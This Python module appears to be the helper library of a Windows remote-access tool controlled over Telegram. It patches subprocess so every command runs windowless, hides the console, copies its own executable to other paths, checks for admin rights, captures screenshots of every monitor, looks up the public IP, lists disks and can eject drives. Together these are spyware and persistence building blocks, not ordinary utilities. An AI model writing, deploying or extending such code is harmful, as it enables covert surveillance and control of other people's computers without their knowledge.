import re
import os
import io
import sys
import mss
import ctypes
import socket
import shutil
import requests
import platform
import numpy as np
import subprocess as sp
from cv2 import imencode, IMWRITE_JPEG_QUALITY

user32 = ctypes.windll.user32

conflict_error = "Conflict: terminated by other getUpdates request; make sure that only one bot instance is running', 409, {'ok': False, 'error_code': 409, 'description': 'Conflict: terminated by other getUpdates request; make sure that only one bot instance is running"

ANSI_ESCAPE_RE = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')

def get_original_exe():
    try:
        print("[get_original_exe] Getting path...")
        return os.path.abspath(__compiled__.original_argv0)
    except Exception:
        print("[get_original_exe] Failed, returning sys.argv[0]")
        return os.path.abspath(sys.argv[0])

BASE_EXE = get_original_exe()

# This will force every subprocess.Popen and os.system to be windowless
_default_Popen = sp.Popen
def _patched_popen(*args, **kwargs):
    kwargs["creationflags"] = kwargs.get("creationflags", 0) | sp.CREATE_NO_WINDOW
    kwargs.setdefault("stderr", sp.PIPE)
    kwargs.setdefault("stdout", sp.PIPE)
    return _default_Popen(*args, **kwargs)
sp.Popen = _patched_popen

def copy_myself(target_path: str) -> bool:
    current_exe = get_original_exe()
    target_path = os.path.abspath(target_path)
    if current_exe.lower() == target_path.lower():
        return False
    try:
        os.makedirs(os.path.dirname(target_path), exist_ok=True)
        shutil.copy2(current_exe, target_path)
        return True
    except:
        return False

def is_number(s):
    try:
        float(s)
        return True
    except (ValueError, TypeError):
        return False

def strip_ansi(text: str) -> str:
    return ANSI_ESCAPE_RE.sub('', text)

def restart():
    os.execv(sys.executable, [sys.executable] + sys.argv)

def hide_console_window() -> None:
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except:
        pass

def craft_file(content: bytes, filename: str, encoding="utf-8"):
    buf = io.BytesIO()
    if isinstance(content, str):
        content = content.encode(encoding)
    buf.write(content)
    buf.seek(0)
    buf.name = filename
    return buf

def eject_drive_windows(letter: str):
    letter = letter.upper()
    if not letter.endswith(":"):
        letter += ":"

    path = f"\\\\.\\{letter}"

    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 3

    IOCTL_STORAGE_EJECT_MEDIA = 0x2D4808

    handle = ctypes.windll.kernel32.CreateFileW(
        path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        None,
        OPEN_EXISTING,
        0,
        None
    )

    if handle == -1:
        raise OSError("Failed to open drive")

    bytes_returned = ctypes.c_ulong()

    res = ctypes.windll.kernel32.DeviceIoControl(
        handle,
        IOCTL_STORAGE_EJECT_MEDIA,
        None,
        0,
        None,
        0,
        ctypes.byref(bytes_returned),
        None
    )

    ctypes.windll.kernel32.CloseHandle(handle)

    if not res:
        raise OSError("Failed to eject media")

def is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def numpy_to_jpg_bytes(capture_dict, quality=85) -> bytes:
    img = capture_dict["screenshot"]
    success, encoded = imencode(
        '.jpg',
        img,
        [int(IMWRITE_JPEG_QUALITY), quality]
    )

    if not success:
        raise RuntimeError("JPEG encoding failed")

    return encoded.tobytes()   # pure bytes

def screen_grub(sct=None, monitor=None):
    if sct is None:
        sct = mss.mss()
    raw = sct.grab(monitor if monitor else sct.monitors[0])
    img_bgra = np.array(raw)
    cv2_array = img_bgra[:, :, :3]
    sct.close()
    return monitor, cv2_array

def fast_screenshot():
    """
    Generator that captures screenshots of all monitors and yields
    dictionaries with the format:
        {"monitor": int, "screenshot": np.ndarray (OpenCV BGR format)}

    Yields one dict per monitor.

    Example usage:
        for capture in fast_screenshot():
            idx = capture["monitor"]
            img = capture["screenshot"]
            cv2.imshow(f"Monitor {idx}", img)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cv2.destroyAllWindows()
    """
    with mss.mss() as sct:
        for idx, monitor in enumerate(sct.monitors[1:], start=1):
            monitor, cv2_array = screen_grub(sct, monitor)
            yield {"monitor": f"Monitor N°{idx}", "screenshot": cv2_array}

def cv2_to_bytesio(image, ext=".png") -> io.BytesIO:
    ok, buf = imencode(ext, image)
    if not ok:
        return None

    bio = io.BytesIO(buf.tobytes())
    bio.seek(0)
    return bio

def get_public_ip() -> str:
    try:
        r = requests.get("https://ifconfig.co", 
                        timeout=4,
                        headers={"User-Agent": "curl/8.0"}
        )
    except requests.exceptions.Timeout:
        return "N/A"
    return r.text

def escape_md(text: str) -> str:
    """Escape text for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+-=|{}.!])', r'\\\1', text)

def check_connection():
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("www.google.com", 80))
    except socket.gaierror:
        return False
    except TimeoutError:
        return False
    return True

def get_disk_info() -> list[dict]:
    """
    returns a list structure like this one
    [
        {
        "disk_name":  "C",
        "tot_size":   "800 GB",
        "used":       "400 GB",
        "free":       "400 GB",
        "percentage": "50%"
        }
    ]
    
    :return: Description
    :rtype: list[dict]
    """
    disk_info = []
    if platform.system() == 'Windows':
        for disk in ['%s:' % d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ']:
            try:
                total, used, free = shutil.disk_usage(disk)
                disk_info.append({
                    "disk_name": disk,
                    "tot_size": f"{total / (1024.0 ** 3):.2f} GB",
                    "used": f"{used / (1024.0 ** 3):.2f} GB",
                    "free": f"{free / (1024.0 ** 3):.2f} GB",
                    "percentage": f"{(used / total) * 100:.2f}"
                })
            except OSError:
                continue
    else:
        for disk in ['/']:
            try:
                st = os.statvfs(disk)
                total = st.f_frsize * st.f_blocks
                free = st.f_frsize * st.f_bavail
                used = total - free
                disk_info.append({
                    "disk_name": disk,
                    "tot_size": f"{total / (1024.0 ** 3):.2f} GB",
                    "used": f"{used / (1024.0 ** 3):.2f} GB",
                    "free": f"{free / (1024.0 ** 3):.2f} GB",
                    "percentage": f"{(used / total) * 100:.2f}%"
                })
            except OSError:
                continue
    return disk_info

def format_disk(disc: dict, loading_bar_set=["▰","▱"]) -> str:
    name = disc["disk_name"]
    used = disc["used"]
    free = disc["free"]
    tot_size = disc["tot_size"]
    perc = float(disc["percentage"])

    bar_size = 20
    filled_len = round(bar_size * perc / 100)

    filled = loading_bar_set[0] * filled_len
    empty = loading_bar_set[1] * (bar_size - filled_len)
    bar = filled + empty

    return (
        f"🗄 <b>{name}</b>\n"
        f"<code>{bar}</code>  {perc:.1f}%\n"
        f"📦 {used} / {tot_size}\n"
        f"🆓 Free: {free}\n"
    )